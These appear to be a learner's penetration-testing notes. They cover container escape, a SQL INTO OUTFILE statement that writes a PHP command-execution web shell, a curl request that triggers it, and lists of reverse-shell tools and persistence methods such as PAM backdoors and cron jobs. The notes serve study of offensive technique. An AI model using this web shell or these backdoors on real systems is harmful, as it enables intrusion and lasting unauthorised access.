
Now there are several ways to escape a container, all typically stemming from misconfigurations of the contrainer from services or access controls.

[https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

This is the code that will help us to create or can see help us to inject our php code that we can trigger to get the RCE vulnerability.

```sql

select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

![[Pasted image 20240215205743.png]]

```bash

curl 192.168.100.1:8080/shell.php?cmd=whoami
```

One thing to keep in mind that: How to get a reverse shell on a box once you have RCE: netcat bash python perl

So what to do after we gained a decent foothold and have a stable shell. Like we don't want to lose our foothold and redo the work if the machine is reset or our shell get's terminated.

SO different methods for persistence: LD_PRELOAD Backdoored binaries PAM backdoor SSH keys Malicious Services Cronjob Credential harvesting